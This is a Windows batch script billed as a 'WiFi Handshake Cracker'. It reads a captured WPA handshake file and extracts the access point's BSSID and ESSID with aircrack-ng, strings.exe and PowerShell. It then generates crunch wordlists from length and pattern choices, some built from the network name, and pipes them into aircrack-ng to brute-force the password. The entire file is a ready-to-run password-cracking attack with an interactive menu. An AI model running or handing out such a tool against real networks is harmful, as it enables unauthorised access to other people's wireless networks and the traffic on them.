@echo off
setlocal enabledelayedexpansion

:: ==============================================
:: WiFi Handshake Cracker (Windows .bat)
:: Converts core logic of bash script to Windows
:: Requires: aircrack-ng.exe, crunch.exe, strings.exe (optional)
:: Developer: generated for Abu Khadija
:: ==============================================

:: -----------------------
:: Helper: show help
:: -----------------------
if "%~1"=="" goto show_help
if /I "%~1"=="-h" goto show_help
if /I "%~1"=="--help" goto show_help
if /I "%~1"=="-v" goto show_version
if /I "%~1"=="--version" goto show_version
if /I "%~1"=="--test" goto test_mode

:: -----------------------
:: Get full path & filename
:: -----------------------
set "FILEPATH=%~1"
if not exist "%FILEPATH%" (
    echo ❌ Error: File "%FILEPATH%" not found!
    echo Usage: %~nx0 ^<handshake.cap^>
    exit /b 1
)
for %%I in ("%FILEPATH%") do (
    set "FILENAME=%%~nxI"
    set "FULLPATH=%%~fI"
)

echo =======================================================
echo            WiFi Handshake Cracker (Windows)
echo =======================================================
echo File: %FILENAME%
echo Path: %FULLPATH%
echo.

:: temp files
set "TMPDIR=%TEMP%\wifi_crack_tmp"
if exist "%TMPDIR%" rd /s /q "%TMPDIR%"
mkdir "%TMPDIR%" >nul 2>nul

:: -----------------------
:: Run aircrack-ng analysis
:: -----------------------
where /q aircrack-ng.exe
if %ERRORLEVEL%==0 (
    echo 🔍 Running aircrack-ng analysis...
    aircrack-ng.exe "%FULLPATH%" > "%TMPDIR%\airout.txt" 2>&1
) else (
    echo ⚠️ aircrack-ng.exe not found in PATH. Skipping direct aircrack analysis.
)

:: -----------------------
:: Try to extract BSSID and ESSID using PowerShell regex on airout
:: -----------------------
set "BSSID="
set "ESSID="
if exist "%TMPDIR%\airout.txt" (
    for /f "usebackq delims=" %%A in (`powershell -NoProfile -Command ^
        "Get-Content -Raw '%TMPDIR%\\airout.txt' -ErrorAction SilentlyContinue | Select-String -Pattern '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' -AllMatches | ForEach-Object { $_.Matches } | ForEach-Object { $_.Value } | Select-Object -First 1"`) do set "BSSID=%%A"

    for /f "usebackq delims=" %%B in (`powershell -NoProfile -Command ^
        "$txt = Get-Content -Raw '%TMPDIR%\\airout.txt' -ErrorAction SilentlyContinue; $lines = $txt -split '\r?\n'; foreach($l in $lines){ if($l -match '^\s*\d+\s+([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}\s+(.+)$'){ $m=$matches[2]; $m -replace '\s+(WPA|WEP|OPN|handshake).*','$' } } | Where-Object { $_ -and $_ -ne '' } | Select-Object -First 1"`) do set "ESSID=%%B"
)

:: Basic cleanup: uppercase BSSID
if defined BSSID (
    for /f "delims=" %%M in ('powershell -NoProfile -Command "('%BSSID%').ToUpper()"') do set "BSSID=%%M"
)

:: -----------------------
:: Fallback: use strings.exe to find MAC/ESSID
:: -----------------------
if not defined BSSID (
    where /q strings.exe
    if %ERRORLEVEL%==0 (
        echo ⚠️ aircrack-ng extraction failed; trying strings.exe...
        strings.exe "%FULLPATH%" > "%TMPDIR%\strings.txt" 2>nul
        for /f "usebackq delims=" %%S in (`powershell -NoProfile -Command ^
            "Get-Content -Raw '%TMPDIR%\\strings.txt' -ErrorAction SilentlyContinue | Select-String -Pattern '([0-9A-Fa-f]{2}[:-]){5}[0-9A-Fa-f]{2}' -AllMatches | ForEach-Object { $_.Matches } | ForEach-Object { $_.Value } | Select-Object -First 1"`) do set "BSSID=%%S"

        if not defined ESSID (
            for /f "usebackq delims=" %%E in (`powershell -NoProfile -Command ^
                "Get-Content -Raw '%TMPDIR%\\strings.txt' -ErrorAction SilentlyContinue | Select-String -Pattern '^[A-Za-z0-9_\\-]{1,32}$' -AllMatches | ForEach-Object { $_.Matches } | ForEach-Object { $_.Value } | Select-Object -First 1"`) do set "ESSID=%%E"
        )
    ) else (
        echo ⚠️ strings.exe not found; cannot run fallback string extraction.
    )
)

:: -----------------------
:: If still not found, try filename parsing
:: -----------------------
if not defined BSSID (
    echo ⚠ Could not auto-extract BSSID from capture; trying filename parsing...
    :: assume filename pattern like something_00-11-22-33-44-55_...
    for /f "tokens=2 delims=_" %%F in ("%FILENAME%") do set "POSS=%%F"
    :: convert dashes to colons if present
    if defined POSS (
        set "POSS=%POSS:-=:%"
        rem check format with powershell regex
        for /f "delims=" %%C in ('powershell -NoProfile -Command "if ('%POSS%' -match '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}') { Write-Output $Matches[0].ToUpper() }"') do set "BSSID=%%C"
    )
)

:: -----------------------
:: If still no valid BSSID ask user manually
:: -----------------------
:validate_bssid
if defined BSSID (
    rem validate format with powershell
    powershell -NoProfile -Command "if('%BSSID%' -match '^([0-9A-F]{2}:){5}[0-9A-F]{2}$') { exit 0 } else { exit 1 }"
    if %ERRORLEVEL%==0 goto bssid_ok
    set "BSSID="
)

echo.
echo ❌ Could not automatically extract valid BSSID/MAC.
set /p BSSID="Enter BSSID/MAC (format 00:11:22:33:44:55): "
rem normalize user input: replace - with : and uppercase via powershell
for /f "delims=" %%N in ('powershell -NoProfile -Command "('%BSSID%').Replace('-',':').ToUpper()"') do set "BSSID=%%N"
goto validate_bssid

:bssid_ok
echo ✅ BSSID: %BSSID%
if defined ESSID echo ✅ ESSID: %ESSID%
echo.

:: -----------------------
:: Verify handshake with aircrack-ng -b
:: -----------------------
where /q aircrack-ng.exe
if %ERRORLEVEL%==0 (
    echo 🔎 Verifying handshake with aircrack-ng...
    aircrack-ng.exe "%FULLPATH%" -b "%BSSID%" > "%TMPDIR%\verify.txt" 2>&1
    findstr /I "handshake" "%TMPDIR%\verify.txt" >nul 2>nul
    if %ERRORLEVEL%==0 (
        echo ✅ Valid WPA handshake confirmed
    ) else (
        echo ❌ No valid handshake found for BSSID: %BSSID%
    )
) else (
    echo ⚠️ aircrack-ng.exe not found; skipped handshake verification.
)

:: -----------------------
:: Parameter defaults
:: -----------------------
set "TOOLS_ARG1=8"
set "TOOLS_ARG2=8"
set "TOOLS_ARG3=%%%%%%%%"

:choose_params
echo.
echo === Parameter Selection ===
echo 1) Use default arguments (recommended)
echo 2) Enter custom arguments
if defined ESSID echo 3) Use ESSID-based pattern
echo 4) Show aircrack-ng analysis (first 30 lines)
echo x) Exit
echo.
set /p CHOICE="Choose option (1,2,3,4 or x): "
set "CHOICE=%CHOICE:~0,1%"
if /I "%CHOICE%"=="1" (
    set "ARG1=%TOOLS_ARG1%"
    set "ARG2=%TOOLS_ARG2%"
    set "ARG3=%TOOLS_ARG3%"
    goto params_done
)
if /I "%CHOICE%"=="2" (
    set /p ARG1="Enter min length (e.g. 8): "
    set /p ARG2="Enter max length (e.g. 8): "
    set /p ARG3="Enter pattern for -t (e.g. %%%%@@@@): "
    goto params_done
)
if /I "%CHOICE%"=="3" if defined ESSID (
    set "ARG1=8"
    set "ARG2=12"
    rem build simple pattern from ESSID first four chars uppercase then rest lowercase-ish (approx)
    for /f "delims=" %%E in ('powershell -NoProfile -Command "if('%ESSID%' -ne ''){ $e='%ESSID%'; $p = $e.Substring(0,[Math]::Min(4,$e.Length)).ToUpper(); Write-Output ('@@@@' + $p) }"') do set "ARG3=%%E"
    goto params_done
)
if /I "%CHOICE%"=="4" (
    where /q aircrack-ng.exe
    if %ERRORLEVEL%==0 (
        echo.
        echo === Full Aircrack-ng Analysis (first 30 lines) ===
        aircrack-ng.exe "%FULLPATH%" | more +0
    ) else (
        echo ⚠️ aircrack-ng.exe not found.
    )
    goto choose_params
)
if /I "%CHOICE%"=="x" (
    echo Exiting.
    exit /b 0
)
echo Invalid choice. Try again.
goto choose_params

:params_done
echo.
echo Using values:
echo   Min length = %ARG1%
echo   Max length = %ARG2%
echo   Pattern    = %ARG3%
echo.

:: -----------------------
:: Show final command and confirm
:: -----------------------
echo 🎯 Final command to run:
echo crunch %ARG1% %ARG2% -t "%ARG3%" --stdout ^| aircrack-ng.exe -w- -b "%BSSID%" "%FULLPATH%"
echo.
set /p CONFIRM="Run this command? (y/n): "
if /I not "%CONFIRM%"=="y" (
    echo Cancelled.
    goto cleanup
)

:: -----------------------
:: Ensure crunch & aircrack present
:: -----------------------
where /q crunch.exe
if %ERRORLEVEL% neq 0 (
    echo ❌ Error: 'crunch.exe' not found in PATH.
    echo 💡 Install or put crunch.exe in PATH.
    goto cleanup
)
where /q aircrack-ng.exe
if %ERRORLEVEL% neq 0 (
    echo ❌ Error: 'aircrack-ng.exe' not found in PATH.
    goto cleanup
)

:: -----------------------
:: Run the cracking pipeline
:: -----------------------
echo 🚀 Starting attack...
echo Press Ctrl+C to stop.
crunch.exe %ARG1% %ARG2% -t "%ARG3%" --stdout | aircrack-ng.exe -w- -b "%BSSID%" "%FULLPATH%"

:cleanup
echo.
echo =======================================================
echo Support the developer!
echo =======================================================
if exist "%TMPDIR%" rd /s /q "%TMPDIR%" >nul 2>nul
endlocal
exit /b 0

:show_help
echo =======================================================
echo WiFi Handshake Cracker Tool (Windows .bat)
echo =======================================================
echo Usage: %~nx0 ^<handshake.cap^>
echo Options:
echo   -h, --help     Show this help
echo   -v, --version  Show version
echo   --test         Test mode
echo.
exit /b 0

:show_version
echo WiFi Handshake Cracker Tool for Windows - generated v1.0
echo Fixed BSSID extraction logic (Windows)
exit /b 0

:test_mode
echo 🧪 Test mode: simulated analysis...
echo Expected: BSSID: 00:14:6C:7E:40:80, ESSID: teddy
exit /b 0
